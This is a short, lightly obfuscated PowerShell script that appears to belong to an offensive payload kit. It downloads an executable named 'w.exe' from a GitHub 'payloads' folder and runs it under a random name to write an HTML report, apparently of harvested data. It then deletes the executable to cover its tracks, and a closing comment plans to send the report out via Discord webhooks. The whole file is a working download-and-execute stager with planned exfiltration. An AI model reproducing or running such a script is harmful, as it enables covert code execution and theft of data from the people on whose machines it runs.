function uCmLBUkWvE {

    return -join ((65..90) + (97..122) | Get-Random -Count 10 | ForEach-Object {[char]$_})

}

$TcDrgEHOCo = uCmLBUkWvE
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/AlexKollar/Cryptex/master/payloads/w.exe' -OutFile "$TcDrgEHOCo.exe"


$zXMpyWDQjY = uCmLBUkWvE
iex "./$TcDrgEHOCo.exe /shtml $zXMpyWDQjY.html"

Start-Sleep 2

Remove-Item "$TcDrgEHOCo.exe"

# TODO: remote upload and removal of html via discord webhooks